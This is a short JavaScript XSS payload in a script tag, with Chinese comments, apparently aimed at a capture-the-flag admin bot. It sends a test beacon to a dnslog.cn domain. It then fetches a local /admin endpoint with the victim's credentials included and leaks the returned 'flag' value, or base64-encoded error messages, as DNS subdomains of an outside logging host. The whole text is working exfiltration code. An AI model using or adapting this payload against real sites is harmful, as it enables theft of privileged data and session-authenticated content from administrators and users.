<script>
  // 先外带一个确定的 DNS 请求（测试通道）
  new Image().src = 'http://test-from-bot.mfvewv.dnslog.cn';

  // 再尝试请求 /admin
  try {
    fetch('http://127.0.0.1:3000/admin', { credentials: 'include' })
      .then(r => r.json())
      .then(d => {
        let f = d.flag.replace(/[^a-z0-9]/gi, '-');
        new Image().src = 'http://' + f + '.aop8r0.dnslog.cn';
      })
      .catch(e => {
        new Image().src = 'http://catch-' + btoa(e.message).replace(/=/g, '') + '.aop8r0.dnslog.cn';
      });
  } catch (e) {
    new Image().src = 'http://try-catch-' + btoa(e.message).replace(/=/g, '') + '.aop8r0.dnslog.cn';
  }
</script>
